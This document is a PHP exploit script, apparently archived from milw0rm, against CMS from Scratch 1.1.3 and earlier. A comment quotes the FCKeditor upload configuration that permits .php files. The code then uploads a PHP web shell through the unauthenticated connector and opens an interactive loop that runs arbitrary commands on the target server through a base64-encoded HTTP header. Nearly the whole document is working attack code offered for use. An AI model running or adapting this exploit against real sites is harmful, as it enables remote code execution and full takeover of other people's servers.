<?php

/*
	-----------------------------------------------------------------
	CMS from Scratch <= 1.1.3 (fckeditor) Remote Shell Upload Exploit
	-----------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.[1].: http://cmsfromscratch.com/
	link.[2].: http://cmsfromscratch.googlecode.com/files/cmsfs114b.tgz (tested package)

	[-] vulnerable code in /cms/FCKeditor/editor/filemanager/connectors/php/config.php
	
	27.	// SECURITY: You must explicitelly enable this "connector". (Set it to "true").
	28.	// WARNING: don't just set "ConfigIsEnabled = true", you must be sure that only 
	29.	//		authenticated users can access this file or use some kind of session checking.
	30.	$Config['Enabled'] = true ; <======
	31.	
	32.	$path = $_SERVER["REQUEST_URI"] ;
	33.	$relativePathFromWebServerRoot =  substr($path, 0, strpos($path, "/", 1) );
	34.	// Coming out as /CMS, why???
	35.	
	36.	
	37.	
	38.	// Path to user files relative to the document root.
	39.	// This is what is inserted into the HTML markup
	40.	$Config['UserFilesPath'] = urldecode(rtrim(str_replace('cms/FCKeditor/editor/filemanager/connectors/php', '', dirname($_SERVER['SCRIPT_NAME'])), '/')) ;
	41.	if ($Config['UserFilesPath'] == '') $Config['UserFilesPath'] = '/' ;
	42.	
	43.	// Fill the following value it you prefer to specify the absolute path for the user files directory. Useful if you are using a virtual directory, symbolic link or alias. Examples: 'C:\\MySite\\userfiles\\' or '/root/mysite/userfiles/'.
	44.	// Attention: The above 'UserFilesPath' must point to the same directory.
	45.	// BH note: This is used for browsing the server.. should equate to the real path of the folder where /cms/ is installed
	46.	$Config['UserFilesAbsolutePath'] = realpath('../../../../../../') ;
	47.	
	48.	// Due to security issues with Apache modules, it is reccomended to leave the following setting enabled.
	49.	$Config['ForceSingleExtension'] = true ;
	50.	// Perform additional checks for image files
	51.	// if set to true, validate image size (using getimagesize)
	52.	$Config['SecureImageUploads'] = true;
	53.	// What the user can do with this connector
	54.	$Config['ConfigAllowedCommands'] = array('QuickUpload', 'FileUpload', 'GetFolders', 'GetFoldersAndFiles', 'CreateFolder') ;
	55.	// Allowed Resource Types
	56.	$Config['ConfigAllowedTypes'] = array('File', 'Image', 'Flash', 'Media') ;
	57.	// For security, HTML is allowed in the first Kb of data for files having the following extensions only.
	58.	$Config['HtmlExtensions'] = array("html", "htm", "xml", "xsd", "txt", "js") ;
	59.	
	60.	$Config['AllowedExtensions']['File']	= array('7z', 'aiff', 'asf', 'avi', 'bmp', 'csv', 'doc', 'fla', 'flv', 'gif', 'gz', 'gzip', 'jpeg', 'jpg', 'mid', 'mov', 'mp3', 'mp4', 'mpc', 'mpeg', 'mpg', 'ods', 'odt', 'pdf', 'php', 'png', 'ppt', 'pxd', 'qt', 'ram', 'rar', 'rm', 'rmi', 'rmvb', 'rtf', 'sdc', 'sitd', 'swf', 'sxc', 'sxw', 'tar', 'tgz', 'tif', 'tiff', 'txt', 'vsd', 'wav', 'wma', 'wmv', 'xls', 'xml', 'zip') ;
	61.	$Config['DeniedExtensions']['File']		= array() ; <========
	62.	$Config['FileTypesPath']['File']		= $Config['UserFilesPath'] ;
	63.	$Config['FileTypesAbsolutePath']['File']= $Config['UserFilesAbsolutePath'] ;
	64.	$Config['QuickUploadPath']['File']		= $Config['UserFilesPath'] ;
	65.	$Config['QuickUploadAbsolutePath']['File']= $Config['UserFilesAbsolutePath'] ;

	with a default configuration of this script, an attacker might be able to upload arbitrary files containing malicious PHP code due to
	$Config['AllowedExtensions']['File'] array, used in IsAllowedExt() function to check the file's extension, contains also .php extension
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from {$host}:80 Trying again...";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

print "\n+---------------------------------------------------------------+";
print "\n| CMS from Scratch <= 1.1.3 Remote Shell Upload Exploit by EgiX |";
print "\n+---------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage......: php $argv[0] host path";
	print "\nExample....: php $argv[0] localhost /";
	print "\nExample....: php $argv[0] localhost /cms114/\n";
	die();
}

$host = $argv[1];
$path = $argv[2];

$data  = "--12345\r\n";
$data .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"sh.php\"\r\n";
$data .= "Content-Type: unknown/unknown\r\n\r\n";
$data .= "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>\n";
$data .= "--12345--\r\n";

$packet  = "POST {$path}/cms/FCKeditor/editor/filemanager/connectors/php/upload.php?Type=File HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Length: ".strlen($data)."\r\n";
$packet .= "Content-Type: multipart/form-data; boundary=12345\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $data;

preg_match("/OnUploadCompleted\((.*),\"(.*)\",\"(.*)\",/i", http_send($host, $packet), $html);

if (!in_array(intval($html[1]), array(0, 201))) die("\n[-] Upload failed! (Error {$html[1]})\n");
else print "\n[-] Shell uploaded to {$html[2]}...starting it!\n";

define(STDIN, fopen("php://stdin", "r"));

while(1)
{
	print "\ncmsfs-shell# ";
	$cmd = trim(fgets(STDIN));
	if ($cmd != "exit")
	{
		$packet = "GET {$path}{$html[3]} HTTP/1.0\r\n";
		$packet.= "Host: {$host}\r\n";
		$packet.= "Cmd: ".base64_encode($cmd)."\r\n";
		$packet.= "Connection: close\r\n\r\n";
		$output = http_send($host, $packet);
		if (!eregi("_code_", $output)) die("\n[-] Exploit failed...\n");
		$shell = explode("_code_", $output);
		print "\n{$shell[1]}";
	}
	else break;
}

?>

# milw0rm.com [2008-05-29]
